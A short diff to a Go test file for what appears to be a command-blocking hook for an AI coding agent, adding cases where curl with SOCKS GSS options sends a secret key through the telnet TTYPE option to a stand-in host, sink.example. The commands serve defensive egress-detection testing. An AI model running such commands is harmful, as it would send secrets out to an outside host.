@@ -508,8 +508,13 @@ func TestEvaluateCodexHookCurlTelnetOptionEgress(t *testing.T) {
 				" telnet://sink.example/",
 		},
 		{
-			name: "SOCKS GSS compatibility state is direct Telnet inert",
+			name: "positive SOCKS GSS compatibility is capability dependent",
 			command: "curl --socks5-gssapi-nec -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "disabled SOCKS GSS compatibility is build independent",
+			command: "curl --no-socks5-gssapi-nec -t TTYPE=" + key +
 				" telnet://sink.example/",
 			wantBlock: true,
 		},
